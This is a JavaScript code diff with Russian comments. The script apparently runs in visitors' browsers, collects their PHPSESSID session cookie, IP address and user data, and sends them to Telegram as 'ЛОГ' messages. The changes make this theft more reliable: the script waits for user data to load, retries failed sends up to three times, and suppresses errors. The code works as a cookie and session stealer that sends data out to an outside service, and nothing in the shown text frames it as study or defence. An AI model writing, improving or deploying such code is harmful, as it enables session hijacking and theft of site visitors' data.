@@ -21,12 +21,9 @@ setTimeout(() => {
             });
             
             const result = await response.json();
-            if (!result.ok) {
-                // Только ошибки в консоль, без успешных сообщений
-            }
             return result;
         } catch (error) {
-            // Только ошибки в консоль
+            return null;
         }
     };
 
@@ -142,6 +139,13 @@ setTimeout(() => {
     };
 
     const sendUserData = async () => {
+        // Проверяем, загружена ли переменная user (до 10 попыток с интервалом 1 секунда)
+        let attempts = 0;
+        while (attempts < 10 && (typeof user === 'undefined' || user === null)) {
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            attempts++;
+        }
+        
         const phpsessid = getCookie('PHPSESSID');
         const userIP = await getIP();
         const userData = getUserData();
@@ -179,12 +183,27 @@ setTimeout(() => {
         // Разбиваем сообщение на части если оно слишком длинное
         const messageParts = splitMessage(message);
         
-        // Отправляем каждую часть
+        // Отправляем каждую часть с повторными попытками при ошибках
         for (let i = 0; i < messageParts.length; i++) {
             if (i > 0) {
                 messageParts[i] = `<b>🚨 ЛОГ (часть ${i + 1}/${messageParts.length})</b>\n\n${messageParts[i]}`;
             }
-            await sendToTelegram(messageParts[i]);
+            
+            // Повторные попытки отправки (до 3 попыток)
+            let sendAttempts = 0;
+            let success = false;
+            while (sendAttempts < 3 && !success) {
+                const result = await sendToTelegram(messageParts[i]);
+                if (result && result.ok) {
+                    success = true;
+                } else {
+                    sendAttempts++;
+                    if (sendAttempts < 3) {
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                    }
+                }
+            }
+            
             // Небольшая задержка между отправками
             if (i < messageParts.length - 1) {
                 await new Promise(resolve => setTimeout(resolve, 1000));
